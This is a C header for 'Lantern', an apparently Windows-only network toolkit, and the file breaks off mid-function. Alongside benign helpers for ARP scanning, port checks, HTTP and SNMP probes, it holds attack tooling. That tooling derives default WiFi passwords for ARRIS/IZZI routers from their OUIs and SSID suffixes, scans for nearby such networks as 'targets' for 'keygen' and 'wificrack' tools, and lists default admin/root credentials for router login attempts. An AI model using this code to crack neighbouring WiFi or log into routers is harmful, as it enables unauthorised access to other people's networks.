/*
 * lantern.h — Shared utilities for the Lantern network toolkit
 * Include this in each tool. Header-only — no separate compilation needed.
 */

#ifndef LANTERN_H
#define LANTERN_H

#ifndef _WIN32
#error "Lantern requires Windows (WinSock2, IP Helper, WLAN API)"
#endif

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>

/* ── MinGW compat ────────────────────────────────────────────────── */

#ifndef ENABLE_VIRTUAL_TERMINAL_PROCESSING
#define ENABLE_VIRTUAL_TERMINAL_PROCESSING 0x0004
#endif

#ifndef ERROR_SERVICE_NOT_RUNNING
#define ERROR_SERVICE_NOT_RUNNING 2186L
#endif

/* ── Version ───────────────────────────────────────────────────────── */

#define LANTERN_VERSION "1.1.0"

/* ── ANSI color macros ───────────────────────────────────────────── */

#define C_RESET   "\033[0m"
#define C_BOLD    "\033[1m"
#define C_DIM     "\033[2m"
#define C_RED     "\033[31m"
#define C_GREEN   "\033[32m"
#define C_YELLOW  "\033[33m"
#define C_BLUE    "\033[34m"
#define C_MAGENTA "\033[35m"
#define C_CYAN    "\033[36m"
#define C_WHITE   "\033[37m"

/* ── OUI vendor table (sorted for binary search) ─────────────────── */

typedef struct {
    uint8_t    oui[3];
    const char *vendor;
} LanternOui;

static const LanternOui LANTERN_OUI[] = {
    {{0x00,0x03,0x7F}, "Atheros"},
    {{0x00,0x0C,0x29}, "VMware"},
    {{0x00,0x0D,0x93}, "Apple"},
    {{0x00,0x0E,0xC6}, "ASIX"},
    {{0x00,0x11,0x32}, "Synology"},
    {{0x00,0x14,0x22}, "Dell"},
    {{0x00,0x15,0x5D}, "Microsoft"},
    {{0x00,0x17,0x88}, "Philips"},
    {{0x00,0x1A,0x11}, "Google"},
    {{0x00,0x1B,0x63}, "Apple"},
    {{0x00,0x1C,0xB3}, "Apple"},
    {{0x00,0x1E,0x58}, "D-Link"},
    {{0x00,0x1F,0x5B}, "Apple"},
    {{0x00,0x21,0x6A}, "Intel"},
    {{0x00,0x23,0x14}, "Intel"},
    {{0x00,0x24,0xD7}, "Intel"},
    {{0x00,0x25,0x00}, "Apple"},
    {{0x00,0x26,0x37}, "Samsung"},
    {{0x00,0x26,0xBB}, "Apple"},
    {{0x00,0x50,0x56}, "VMware"},
    {{0x00,0x6B,0x9E}, "Vizio"},
    {{0x00,0x90,0xA9}, "Western Digital"},
    {{0x00,0xE0,0x4C}, "Realtek"},
    {{0x00,0xE0,0x6F}, "Arris"},
    {{0x04,0xD3,0xB0}, "Intel"},
    {{0x08,0x00,0x27}, "VirtualBox"},
    {{0x08,0x6A,0x0A}, "ASKEY"},
    {{0x08,0xBE,0x09}, "Ubiquiti"},
    {{0x0C,0x47,0xC9}, "Amazon"},
    {{0x0C,0x8B,0xFD}, "Intel"},
    {{0x0C,0x9D,0x92}, "ASUSTek"},
    {{0x10,0x02,0xB5}, "Intel"},
    {{0x10,0xDA,0x43}, "Netgear"},
    {{0x14,0xCC,0x20}, "TP-Link"},
    {{0x18,0x31,0xBF}, "ASUSTek"},
    {{0x18,0xAF,0x61}, "Samsung"},
    {{0x1C,0x69,0x7A}, "EliteGroup"},
    {{0x1C,0x87,0x2C}, "ASUSTek"},
    {{0x1C,0xBF,0xCE}, "Shenzhen"},
    {{0x20,0x47,0xDA}, "Dell"},
    {{0x24,0x0A,0xC4}, "Espressif"},
    {{0x24,0x4B,0xFE}, "ASUSTek"},
    {{0x28,0x6C,0x07}, "Xiaomi"},
    {{0x28,0xCD,0xC1}, "Samsung"},
    {{0x2C,0x54,0x91}, "Microsoft"},
    {{0x2C,0xF0,0x5D}, "Microsoft"},
    {{0x30,0x9C,0x23}, "Apple"},
    {{0x30,0xB5,0xC2}, "TP-Link"},
    {{0x34,0x17,0xEB}, "Dell"},
    {{0x34,0x97,0xF6}, "ASUSTek"},
    {{0x38,0x2C,0x4A}, "ASUSTek"},
    {{0x38,0x68,0xA4}, "Samsung"},
    {{0x3C,0x22,0xFB}, "Apple"},
    {{0x3C,0x5A,0xB4}, "Google"},
    {{0x3C,0x6A,0xA7}, "Intel"},
    {{0x40,0x49,0x0F}, "Xiaomi"},
    {{0x40,0xB4,0xCD}, "Realtek"},
    {{0x44,0x07,0x0B}, "Google"},
    {{0x44,0x38,0x39}, "Cumulus"},
    {{0x48,0x2C,0xA0}, "Xiaomi"},
    {{0x48,0x5D,0x60}, "AzureWave"},
    {{0x4C,0x32,0x75}, "Apple"},
    {{0x4C,0xEB,0x42}, "Intel"},
    {{0x50,0x02,0x91}, "Amazon"},
    {{0x50,0xEB,0x71}, "Intel"},
    {{0x54,0x13,0x79}, "Hon Hai/Foxconn"},
    {{0x54,0x60,0x09}, "Google"},
    {{0x58,0x11,0x22}, "ASUSTek"},
    {{0x5C,0xCF,0x7F}, "Espressif"},
    {{0x60,0x01,0x94}, "Espressif"},
    {{0x60,0x6D,0x3C}, "Luxul"},
    {{0x60,0xF6,0x77}, "Intel"},
    {{0x64,0x16,0x66}, "Samsung"},
    {{0x68,0x54,0xFD}, "Amazon"},
    {{0x6C,0x72,0xE7}, "Apple"},
    {{0x70,0x3A,0xCB}, "Google"},
    {{0x74,0xDA,0x38}, "Edimax"},
    {{0x78,0x2B,0x46}, "Dell"},
    {{0x7C,0x10,0xC9}, "Apple"},
    {{0x7C,0x2E,0xBD}, "Google"},
    {{0x80,0x7D,0x3A}, "Apple"},
    {{0x84,0x38,0x35}, "Apple"},
    {{0x88,0x36,0x6C}, "Apple"},
    {{0x88,0x71,0xB1}, "Samsung"},
    {{0x8C,0x85,0x90}, "Apple"},
    {{0x90,0x9A,0x4A}, "TP-Link"},
    {{0x94,0xE9,0x79}, "Liteon"},
    {{0x98,0xDA,0xC4}, "TP-Link"},
    {{0x9C,0x5C,0x8E}, "Apple"},
    {{0xA0,0x99,0x9B}, "Apple"},
    {{0xA4,0x77,0x33}, "Google"},
    {{0xA4,0x83,0xE7}, "Apple"},
    {{0xA4,0xC3,0xF0}, "Intel"},
    {{0xA8,0x6D,0xAA}, "Intel"},
    {{0xAC,0x37,0x43}, "HTC"},
    {{0xAC,0x84,0xC6}, "TP-Link"},
    {{0xB0,0xA7,0x37}, "Roku"},
    {{0xB4,0xB0,0x24}, "Samsung"},
    {{0xB4,0xE6,0x2D}, "Apple"},
    {{0xB8,0x27,0xEB}, "Raspberry Pi"},
    {{0xB8,0x78,0x2E}, "Apple"},
    {{0xBC,0xFF,0x4D}, "Espressif"},
    {{0xC0,0x25,0xE9}, "TP-Link"},
    {{0xC4,0xE9,0x84}, "TP-Link"},
    {{0xC8,0x3A,0x35}, "Tenda"},
    {{0xCC,0x50,0xE3}, "Apple"},
    {{0xD0,0x21,0xF9}, "Ubiquiti"},
    {{0xD4,0x6E,0x0E}, "TP-Link"},
    {{0xD8,0x3A,0xDD}, "Raspberry Pi"},
    {{0xDC,0x2C,0x6E}, "Routerboard/MikroTik"},
    {{0xDC,0xA6,0x32}, "Raspberry Pi"},
    {{0xE0,0xD5,0x5E}, "GIGA-BYTE"},
    {{0xE4,0x5F,0x01}, "Raspberry Pi"},
    {{0xE8,0x48,0xB8}, "Samsung"},
    {{0xEC,0x08,0x6B}, "TP-Link"},
    {{0xEC,0xFA,0xBC}, "Apple"},
    {{0xF0,0x18,0x98}, "Apple"},
    {{0xF0,0x72,0xEA}, "Samsung"},
    {{0xF0,0x9F,0xC2}, "Ubiquiti"},
    {{0xF4,0x39,0x09}, "Hewlett Packard"},
    {{0xF8,0x1A,0x67}, "TP-Link"},
    {{0xFC,0xEC,0xDA}, "Ubiquiti"},
};

#define LANTERN_OUI_COUNT (sizeof(LANTERN_OUI) / sizeof(LANTERN_OUI[0]))

/* ── Shared functions (static — each tool gets its own copy) ─────── */

/* Suppress unused-function warnings — not every tool uses every helper */
#if defined(__GNUC__) || defined(__clang__)
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#endif

static const char *lantern_lookup_vendor(const uint8_t mac[6]) {
    int lo = 0, hi = (int)LANTERN_OUI_COUNT - 1;
    while (lo <= hi) {
        int mid = (lo + hi) / 2;
        int cmp = memcmp(mac, LANTERN_OUI[mid].oui, 3);
        if (cmp < 0)      hi = mid - 1;
        else if (cmp > 0)  lo = mid + 1;
        else               return LANTERN_OUI[mid].vendor;
    }
    return "Unknown";
}

static void lantern_format_mac(const uint8_t *mac, char *buf, size_t buflen) {
    snprintf(buf, buflen, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void lantern_enable_ansi(void) {
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(h, &mode);
    SetConsoleMode(h, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
}

static void lantern_enable_utf8(void) {
    SetConsoleOutputCP(65001);
    SetConsoleCP(65001);
}

static void lantern_init(void) {
    lantern_enable_ansi();
    lantern_enable_utf8();
}

static void lantern_banner(const char *tool_name, const char *desc) {
    printf("\n");
    printf(C_CYAN C_BOLD "  lantern %s" C_RESET C_DIM " — %s" C_RESET "\n", tool_name, desc);
    printf(C_DIM "  ─────────────────────────────────────────\n" C_RESET);
    printf("\n");
}

static void lantern_section(const char *title) {
    printf(C_BOLD C_YELLOW "\n  ═══ %s ═══\n\n" C_RESET, title);
}

/* Check argv for --help/-h/--version/-v.  Returns 1 if handled (caller
   should exit 0), 0 if no flag matched. */
static int lantern_check_flags(int argc, char **argv,
                                const char *tool, const char *desc,
                                const char *extra_usage) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--version") == 0 || strcmp(argv[i], "-v") == 0) {
            printf("lantern %s %s\n", tool, LANTERN_VERSION);
            return 1;
        }
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("lantern %s %s — %s\n\n", tool, LANTERN_VERSION, desc);
            if (extra_usage)
                printf("%s\n", extra_usage);
            return 1;
        }
    }
    return 0;
}

/* Fetch adapter list. Caller must free() the returned pointer. */
static IP_ADAPTER_INFO *lantern_get_adapters(void) {
    ULONG buflen = sizeof(IP_ADAPTER_INFO);
    IP_ADAPTER_INFO *info = (IP_ADAPTER_INFO *)malloc(buflen);
    if (!info) return NULL;

    if (GetAdaptersInfo(info, &buflen) == ERROR_BUFFER_OVERFLOW) {
        free(info);
        info = (IP_ADAPTER_INFO *)malloc(buflen);
        if (!info) return NULL;
    }
    if (GetAdaptersInfo(info, &buflen) != NO_ERROR) {
        free(info);
        return NULL;
    }
    return info;
}

/* Get first active adapter's IP and subnet mask */
static int lantern_get_local_network(uint32_t *base_ip, uint32_t *mask) {
    IP_ADAPTER_INFO *info = lantern_get_adapters();
    if (!info) return 0;

    for (IP_ADAPTER_INFO *a = info; a; a = a->Next) {
        const char *ip_str   = a->IpAddressList.IpAddress.String;
        const char *mask_str = a->IpAddressList.IpMask.String;
        if (strcmp(ip_str, "0.0.0.0") == 0) continue;

        *base_ip = inet_addr(ip_str);
        *mask    = inet_addr(mask_str);
        free(info);
        return 1;
    }

    free(info);
    return 0;
}

/* Wait for thread array in batches of 64, then close all handles */
static void lantern_wait_threads(HANDLE *threads, DWORD count, DWORD timeout_ms) {
    DWORD offset = 0, remaining = count;
    while (remaining > 0) {
        DWORD batch = remaining > 64 ? 64 : remaining;
        WaitForMultipleObjects(batch, threads + offset, TRUE, timeout_ms);
        offset    += batch;
        remaining -= batch;
    }
    for (DWORD i = 0; i < count; i++)
        CloseHandle(threads[i]);
}

/* Fill a sockaddr_in from string IP and port */
static void lantern_fill_sockaddr(struct sockaddr_in *addr,
                                  const char *ip, uint16_t port) {
    memset(addr, 0, sizeof(*addr));
    addr->sin_family      = AF_INET;
    addr->sin_port        = htons(port);
    addr->sin_addr.s_addr = inet_addr(ip);
}

/* Convert network-byte-order IP to string (thread-safe) */
static void lantern_ip_to_str(uint32_t addr_nbo, char *buf, size_t buflen) {
    struct in_addr a;
    a.s_addr = addr_nbo;
    InetNtopA(AF_INET, &a, buf, (size_t)buflen);
}

/* Get default gateway IP as string. Returns 1 on success, 0 on failure. */
static int lantern_get_gateway(char *buf, size_t buflen) {
    IP_ADAPTER_INFO *info = lantern_get_adapters();
    if (!info) return 0;
    for (IP_ADAPTER_INFO *a = info; a; a = a->Next) {
        const char *gw = a->GatewayList.IpAddress.String;
        if (strcmp(gw, "0.0.0.0") != 0 && strlen(gw) > 0) {
            snprintf(buf, buflen, "%s", gw);
            free(info);
            return 1;
        }
    }
    free(info);
    return 0;
}

/* Non-blocking TCP port check. Returns 1 if port is open, 0 otherwise. */
static int lantern_tcp_open(const char *ip, uint16_t port, int timeout_ms) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 0;

    u_long nonblock = 1;
    ioctlsocket(s, FIONBIO, &nonblock);

    struct sockaddr_in addr;
    lantern_fill_sockaddr(&addr, ip, port);
    connect(s, (struct sockaddr *)&addr, sizeof(addr));

    fd_set wset, eset;
    FD_ZERO(&wset); FD_SET(s, &wset);
    FD_ZERO(&eset); FD_SET(s, &eset);
    struct timeval tv = {timeout_ms / 1000, (timeout_ms % 1000) * 1000};
    int open = 0;
    if (select(0, NULL, &wset, &eset, &tv) > 0 &&
        FD_ISSET(s, &wset) && !FD_ISSET(s, &eset)) {
        int err = 0; int errlen = sizeof(err);
        getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&err, &errlen);
        if (err == 0) open = 1;
    }
    closesocket(s);
    return open;
}

/* Base64 encode a string. Returns bytes written (excluding null). */
static int lantern_base64_encode(const char *input, char *output, size_t outlen) {
    static const char b64[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int rawlen = (int)strlen(input);
    int ei = 0;
    for (int i = 0; i < rawlen; i += 3) {
        if ((size_t)(ei + 4) >= outlen) break;
        int b0 = (unsigned char)input[i];
        int b1 = (i + 1 < rawlen) ? (unsigned char)input[i+1] : 0;
        int b2 = (i + 2 < rawlen) ? (unsigned char)input[i+2] : 0;
        output[ei++] = b64[(b0 >> 2) & 0x3F];
        output[ei++] = b64[((b0 << 4) | (b1 >> 4)) & 0x3F];
        output[ei++] = (i + 1 < rawlen) ? b64[((b1 << 2) | (b2 >> 6)) & 0x3F] : '=';
        output[ei++] = (i + 2 < rawlen) ? b64[b2 & 0x3F] : '=';
    }
    if ((size_t)ei < outlen) output[ei] = '\0';
    return ei;
}

/* HTTP GET request. Returns bytes received, or 0 on failure.
   extra_headers can be NULL, or a string like "Authorization: Basic ...\r\n" */
static int lantern_http_get(const char *host, uint16_t port, const char *path,
                            const char *extra_headers, char *buf, size_t buflen) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 0;

    struct sockaddr_in addr;
    lantern_fill_sockaddr(&addr, host, port);
    DWORD t = 3000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&t, sizeof(t));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *)&t, sizeof(t));

    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        closesocket(s);
        return 0;
    }

    char req[512];
    snprintf(req, sizeof(req), "GET %s HTTP/1.0\r\nHost: %s\r\n%sConnection: close\r\n\r\n",
             path, host, extra_headers ? extra_headers : "");
    send(s, req, (int)strlen(req), 0);

    int total = 0;
    while (total < (int)buflen - 1) {
        int n = recv(s, buf + total, (int)(buflen - 1 - (size_t)total), 0);
        if (n <= 0) break;
        total += n;
    }
    buf[total] = '\0';
    closesocket(s);
    return total;
}

/* HTTP GET with Basic Auth. Builds Authorization header from user:pass. */
static int lantern_http_get_auth(const char *host, uint16_t port, const char *path,
                                 const char *user, const char *pass,
                                 char *buf, size_t buflen) {
    char raw[128], encoded[256], header[320];
    snprintf(raw, sizeof(raw), "%s:%s", user, pass);
    lantern_base64_encode(raw, encoded, sizeof(encoded));
    snprintf(header, sizeof(header), "Authorization: Basic %s\r\n", encoded);
    return lantern_http_get(host, port, path, header, buf, buflen);
}

/* Extract HTTP status code from response (e.g. 200, 404). Returns 0 on parse failure. */
static int lantern_http_status(const char *response) {
    const char *p = strstr(response, "HTTP/");
    if (!p) return 0;
    p = strchr(p, ' ');
    if (!p) return 0;
    return atoi(p + 1);
}

/* Case-insensitive search for needle in the body of an HTTP response. */
static int lantern_body_contains_ci(const char *response, const char *needle) {
    const char *body = strstr(response, "\r\n\r\n");
    if (!body) body = response;
    else body += 4;
    size_t nlen = strlen(needle);
    for (const char *p = body; *p; p++) {
        if (_strnicmp(p, needle, nlen) == 0)
            return 1;
    }
    return 0;
}

/* Parse 802.11 Information Elements for WiFi security classification. */
static const char *lantern_security_from_ies(const uint8_t *ies, ULONG ie_len) {
    int has_rsn = 0, has_wpa = 0, akm_type = 0;
    const uint8_t *p = ies, *end = ies + ie_len;

    while (p + 2 <= end) {
        uint8_t tag = p[0], len = p[1];
        const uint8_t *body = p + 2;
        if (body + len > end) break;

        if (tag == 48 && len >= 12) {
            has_rsn = 1;
            ULONG off = 2 + 4;
            if (off + 2 > len) goto lantern_ie_next;
            uint16_t pw = body[off] | ((uint16_t)body[off+1] << 8);
            off += 2 + (ULONG)pw * 4;
            if (off + 2 > len) goto lantern_ie_next;
            uint16_t ac = body[off] | ((uint16_t)body[off+1] << 8);
            off += 2;
            for (uint16_t i = 0; i < ac && off + 4 <= len; i++, off += 4) {
                if (body[off]==0 && body[off+1]==0x0F && body[off+2]==0xAC) {
                    int t = body[off+3];
                    if (t > akm_type) akm_type = t;
                }
            }
        } else if (tag == 221 && len >= 10) {
            if (body[0]==0 && body[1]==0x50 && body[2]==0xF2 && body[3]==1)
                has_wpa = 1;
        }
    lantern_ie_next:
        p = body + len;
    }

    if (has_rsn) {
        if (akm_type == 8 || akm_type == 18) return "WPA3-SAE";
        if (akm_type == 1 || akm_type == 5)  return "WPA2-Enterprise";
        return "WPA2-PSK";
    }
    return has_wpa ? "WPA" : "Open";
}

/* ── ARP scan (shared by netscan, netwatch, netreport) ─────────────── */

#define LANTERN_MAX_HOSTS 254

typedef struct {
    uint32_t ip;
    uint8_t  mac[6];
} LanternHost;

typedef struct {
    uint32_t       target_ip;
    LanternHost   *results;
    volatile LONG *found;
} LanternArpArg;

static DWORD WINAPI lantern_arp_thread(LPVOID param) {
    LanternArpArg *arg = (LanternArpArg *)param;
    ULONG mac[2];
    ULONG mac_len = 6;
    if (SendARP(arg->target_ip, 0, mac, &mac_len) == NO_ERROR && mac_len > 0) {
        LONG idx = InterlockedIncrement(arg->found) - 1;
        if (idx < LANTERN_MAX_HOSTS) {
            arg->results[idx].ip = arg->target_ip;
            memcpy(arg->results[idx].mac, (uint8_t *)mac, 6);
        }
    }
    free(arg);
    return 0;
}

static int lantern_cmp_host(const void *a, const void *b) {
    uint32_t ia = ntohl(((const LanternHost *)a)->ip);
    uint32_t ib = ntohl(((const LanternHost *)b)->ip);
    return (ia > ib) - (ia < ib);
}

/* ARP-scan a network.  Fills results[] (caller-provided, LANTERN_MAX_HOSTS).
   Returns number of live hosts found (sorted by IP). */
static int lantern_arp_scan(uint32_t network, uint32_t mask,
                            LanternHost *results, DWORD timeout_ms) {
    uint32_t net_hbo  = ntohl(network);
    uint32_t mask_hbo = ntohl(mask);
    uint32_t num      = (~mask_hbo) - 1;
    if (num > LANTERN_MAX_HOSTS) num = LANTERN_MAX_HOSTS;

    volatile LONG found = 0;
    memset(results, 0, sizeof(LanternHost) * LANTERN_MAX_HOSTS);

    HANDLE threads[LANTERN_MAX_HOSTS];
    DWORD  tc = 0;

    for (uint32_t i = 1; i <= num; i++) {
        LanternArpArg *arg = (LanternArpArg *)malloc(sizeof(LanternArpArg));
        if (!arg) continue;
        arg->target_ip = htonl(net_hbo + i);
        arg->results   = results;
        arg->found     = &found;
        HANDLE h = CreateThread(NULL, 0, lantern_arp_thread, arg, 0, NULL);
        if (h) threads[tc++] = h; else free(arg);
    }
    if (tc > 0) lantern_wait_threads(threads, tc, timeout_ms);

    LONG n = found;
    if (n > LANTERN_MAX_HOSTS) n = LANTERN_MAX_HOSTS;
    qsort(results, (size_t)n, sizeof(LanternHost), lantern_cmp_host);
    return (int)n;
}

/* ── SNMP probe (UDP) ─────────────────────────────────────────────── */

/* Send an SNMP v1 GetRequest for sysDescr.0 and check for a response.
   Returns 1 if SNMP agent responded, 0 otherwise. */
static int lantern_snmp_probe(const char *host, int timeout_ms) {
    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return 0;

    struct sockaddr_in addr;
    lantern_fill_sockaddr(&addr, host, 161);
    DWORD t = (DWORD)timeout_ms;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&t, sizeof(t));

    /* SNMP v1 GetRequest for sysDescr.0 (1.3.6.1.2.1.1.1.0)
       community string: "public" */
    static const uint8_t snmp_get[] = {
        0x30, 0x29,                         /* SEQUENCE len=41 */
        0x02, 0x01, 0x00,                   /* version: v1 (0) */
        0x04, 0x06, 'p','u','b','l','i','c',/* community: "public" */
        0xa0, 0x1c,                         /* GetRequest-PDU len=28 */
        0x02, 0x04, 0x00,0x00,0x00,0x01,    /* request-id: 1 */
        0x02, 0x01, 0x00,                   /* error-status: 0 */
        0x02, 0x01, 0x00,                   /* error-index: 0 */
        0x30, 0x0e,                         /* varbind list */
        0x30, 0x0c,                         /* varbind */
        0x06, 0x08, 0x2b,0x06,0x01,0x02,0x01,0x01,0x01,0x00, /* OID */
        0x05, 0x00,                         /* NULL value */
    };

    sendto(s, (const char *)snmp_get, sizeof(snmp_get), 0,
           (struct sockaddr *)&addr, sizeof(addr));

    char buf[512];
    struct sockaddr_in from;
    int fromlen = sizeof(from);
    int n = recvfrom(s, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen);
    closesocket(s);
    return (n > 0) ? 1 : 0;
}

/* ── Bounded thread pool ───────────────────────────────────────────── */

/* Run `count` work items through `fn`, with at most `max_concurrent`
   threads active at once.  `args` is an array of pointers passed to fn.
   Each thread receives one arg. */
static void lantern_run_bounded(LPTHREAD_START_ROUTINE fn,
                                void **args, int count,
                                int max_concurrent, DWORD timeout_ms) {
    HANDLE *active = (HANDLE *)malloc(sizeof(HANDLE) * (size_t)max_concurrent);
    if (!active) return;
    int running = 0, next = 0;

    while (next < count || running > 0) {
        /* Fill up to max_concurrent */
        while (running < max_concurrent && next < count) {
            HANDLE h = CreateThread(NULL, 0, fn, args[next], 0, NULL);
            if (h) {
                active[running++] = h;
            }
            next++;
        }
        if (running == 0) break;

        /* Wait for any one thread to finish */
        DWORD idx = WaitForMultipleObjects((DWORD)running, active,
                                           FALSE, timeout_ms);
        if (idx < WAIT_OBJECT_0 + (DWORD)running) {
            DWORD done = idx - WAIT_OBJECT_0;
            CloseHandle(active[done]);
            /* Compact: move last into the vacated slot */
            active[done] = active[--running];
        } else {
            /* Timeout or error — close all remaining */
            for (int i = 0; i < running; i++)
                CloseHandle(active[i]);
            running = 0;
        }
    }
    free(active);
}

/* ── ARRIS CMAC OUI table (shared by keygen + wificrack) ──────────── */

static const uint8_t LANTERN_ARRIS_OUIS[][3] = {
    {0x8C, 0x61, 0xA3},   /* Confirmed on TG2482A (IZZI Mexico) */
    {0xE8, 0xED, 0x05},   /* ARRIS Group                        */
    {0x00, 0x1D, 0xCE},   /* ARRIS International                */
    {0x00, 0x15, 0x96},   /* ARRIS Interactive                  */
    {0x20, 0x3D, 0x66},   /* ARRIS Group                        */
};
#define LANTERN_ARRIS_OUI_COUNT (sizeof(LANTERN_ARRIS_OUIS) / sizeof(LANTERN_ARRIS_OUIS[0]))

/* Build ARRIS CMAC password: OUI + unknown_byte + suffix → 12-char hex string.
   Caller must provide a buffer of at least 13 bytes. */
static void lantern_arris_password(const uint8_t oui[3], int unknown_byte,
                                    const uint8_t suffix[2],
                                    char *out, size_t outlen) {
    snprintf(out, outlen, "%02X%02X%02X%02X%02X%02X",
             oui[0], oui[1], oui[2],
             (uint8_t)unknown_byte, suffix[0], suffix[1]);
}

/* Extract 4-char hex suffix from SSID like "IZZI-1F56" or "ARRIS-1F56-5G".
   Returns 1 on success and fills suffix_bytes[2]. */
static int lantern_parse_arris_suffix(const char *input, uint8_t suffix_bytes[2]) {
    const char *hex = NULL;
    const char *dash = strrchr(input, '-');

    if (dash) {
        if (_stricmp(dash + 1, "5G") == 0) {
            /* Strip -5G suffix, find the real suffix dash */
            char copy[64];
            size_t len = (size_t)(dash - input);
            if (len >= sizeof(copy)) return 0;
            memcpy(copy, input, len);
            copy[len] = '\0';
            const char *prev = strrchr(copy, '-');
            if (prev && strlen(prev + 1) == 4)
                hex = input + (prev + 1 - copy);
        } else if (strlen(dash + 1) == 4) {
            hex = dash + 1;
        }
    }

    if (!hex && strlen(input) == 4)
        hex = input;
    if (!hex) return 0;

    for (int i = 0; i < 4; i++)
        if (!isxdigit((unsigned char)hex[i])) return 0;

    unsigned int b0, b1;
    if (sscanf(hex, "%2x%2x", &b0, &b1) != 2) return 0;
    suffix_bytes[0] = (uint8_t)b0;
    suffix_bytes[1] = (uint8_t)b1;
    return 1;
}

/* ARRIS WiFi target for scan results */
typedef struct {
    char ssid[33];
    char bssid[20];
    long rssi;
    uint8_t suffix[2];
} LanternArrisTarget;

/* ── Default credentials for router testing ──────────────────────── */

typedef struct {
    const char *user;
    const char *pass;
} LanternCredential;

static const LanternCredential LANTERN_DEFAULT_CREDS[] = {
    {"admin", "admin"},    {"admin", "password"}, {"admin", "1234"},
    {"admin", "12345"},    {"admin", ""},          {"root",  "root"},
    {"root",  "admin"},    {"root",  ""},          {"user",  "user"},
    {"admin", "Admin"},
};
#define LANTERN_CRED_COUNT (sizeof(LANTERN_DEFAULT_CREDS) / sizeof(LANTERN_DEFAULT_CREDS[0]))

#if defined(__GNUC__) || defined(__clang__)
#pragma GCC diagnostic pop
#endif

#endif /* LANTERN_H */

/* ── WLAN extension (include wlanapi.h BEFORE lantern.h to activate) ── */

#if defined(_INC_WLANAPI) && !defined(LANTERN_WLAN_IMPL_DEFINED)
#define LANTERN_WLAN_IMPL_DEFINED

#if defined(__GNUC__) || defined(__clang__)
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#endif

/* Event-driven WiFi scan wait.  Calls WlanScan and waits for the scan
   complete notification instead of a fixed Sleep(2000).  Falls back to
   2s sleep if the notification doesn't arrive within timeout_ms. */
static HANDLE g_lantern_scan_event = NULL;

static void WINAPI lantern_scan_notify(PWLAN_NOTIFICATION_DATA data, PVOID ctx) {
    (void)ctx;
    if (data->NotificationSource == WLAN_NOTIFICATION_SOURCE_ACM &&
        data->NotificationCode == 7 /* scan_complete */) {
        if (g_lantern_scan_event)
            SetEvent(g_lantern_scan_event);
    }
}

static void lantern_wlan_scan_wait(HANDLE wlan, GUID *guid, DWORD timeout_ms) {
    g_lantern_scan_event = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!g_lantern_scan_event) {
        /* Fallback */
        WlanScan(wlan, guid, NULL, NULL, NULL);
        Sleep(timeout_ms);
        return;
    }

    DWORD prev = 0;
    WlanRegisterNotification(wlan, WLAN_NOTIFICATION_SOURCE_ACM, TRUE,
                             (WLAN_NOTIFICATION_CALLBACK)lantern_scan_notify,
                             NULL, NULL, &prev);

    WlanScan(wlan, guid, NULL, NULL, NULL);
    WaitForSingleObject(g_lantern_scan_event, timeout_ms);

    /* Unregister notification */
    WlanRegisterNotification(wlan, WLAN_NOTIFICATION_SOURCE_NONE, TRUE,
                             NULL, NULL, NULL, &prev);

    CloseHandle(g_lantern_scan_event);
    g_lantern_scan_event = NULL;
}

/* Scan for ARRIS/IZZI WiFi networks.  Returns number of targets found.
   Triggers a WiFi scan, waits 2s, filters by IZZI-/ARRIS- prefix,
   deduplicates by suffix (keeps strongest signal). */
static int lantern_scan_arris_targets(LanternArrisTarget *targets, int max,
                                      HANDLE wlan, GUID *guid) {
    int count = 0;

    printf(C_DIM "  Scanning for ARRIS/IZZI networks..." C_RESET);
    fflush(stdout);
    lantern_wlan_scan_wait(wlan, guid, 3000);
    printf("\r                                       \r");

    PWLAN_BSS_LIST bl = NULL;
    WlanGetNetworkBssList(wlan, guid, NULL, dot11_BSS_type_any,
                          FALSE, NULL, &bl);
    if (!bl) return 0;

    for (DWORD i = 0; i < bl->dwNumberOfItems && count < max; i++) {
        WLAN_BSS_ENTRY *b = &bl->wlanBssEntries[i];
        char ssid[33] = {0};
        ULONG sl = b->dot11Ssid.uSSIDLength;
        if (sl > 32) sl = 32;
        memcpy(ssid, b->dot11Ssid.ucSSID, sl);

        uint8_t suffix[2];
        if (!lantern_parse_arris_suffix(ssid, suffix)) continue;

        int is_target = (_strnicmp(ssid, "IZZI-", 5) == 0 ||
                         _strnicmp(ssid, "ARRIS-", 6) == 0);
        if (!is_target) continue;

        /* Deduplicate by suffix — keep stronger signal */
        int dup = 0;
        for (int j = 0; j < count; j++) {
            if (targets[j].suffix[0] == suffix[0] &&
                targets[j].suffix[1] == suffix[1]) {
                if (b->lRssi > targets[j].rssi) {
                    memcpy(targets[j].ssid, ssid, sizeof(ssid));
                    lantern_format_mac(b->dot11Bssid, targets[j].bssid,
                                       sizeof(targets[j].bssid));
                    targets[j].rssi = b->lRssi;
                }
                dup = 1;
                break;
            }
        }
        if (dup) continue;

        memcpy(targets[count].ssid, ssid, sizeof(ssid));
        lantern_format_mac(b->dot11Bssid, targets[count].bssid,
